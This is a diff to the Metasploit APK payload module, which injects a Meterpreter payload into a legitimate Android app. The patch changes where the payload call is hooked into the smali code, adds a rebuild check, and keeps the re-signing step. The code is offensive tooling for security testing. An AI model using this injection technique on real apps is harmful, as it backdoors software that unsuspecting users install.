@@ -198,12 +198,12 @@ class Msf::Payload::Apk
     end
 
     unless activitysmali
-      raise RuntimeError, "Unable to find hook point in #{smalifiles}\n"
+      raise RuntimeError, "Unable to find hookable activity in #{smalifiles}\n"
     end
 
-    entrypoint = ';->onCreate(Landroid/os/Bundle;)V'
+    entrypoint = 'return-void'
     unless activitysmali.include? entrypoint
-      raise RuntimeError, "Unable to find onCreate() in #{smalifile}\n"
+      raise RuntimeError, "Unable to find hookable function in #{smalifile}\n"
     end
 
     # Remove unused files
@@ -226,10 +226,10 @@ class Msf::Payload::Apk
       File.open(newfilename, "wb") {|file| file.puts newsmali }
     end
 
-    payloadhook = entrypoint + %Q^
-    invoke-static {p0}, L#{package_slash}/MainService;->startService(Landroid/content/Context;)V
-    ^
-    hookedsmali = activitysmali.gsub(entrypoint, payloadhook)
+    payloadhook = %Q^invoke-static {}, L#{package_slash}/MainService;->start()V
+
+    ^ + entrypoint
+    hookedsmali = activitysmali.sub(entrypoint, payloadhook)
 
     print_status "Loading #{smalifile} and injecting payload..\n"
     File.open(smalifile, "wb") {|file| file.puts hookedsmali }
@@ -241,6 +241,10 @@ class Msf::Payload::Apk
 
     print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}\n"
     run_cmd("apktool b -o #{injected_apk} #{tempdir}/original")
+    unless File.readable?(injected_apk)
+      raise RuntimeError, "Unable to rebuild apk with apktool"
+    end
+
     print_status "Signing #{injected_apk}\n"
     run_cmd("jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore #{keystore} -storepass #{storepass} -keypass #{keypass} #{injected_apk} #{keyalias}")
     print_status "Aligning #{injected_apk}\n"
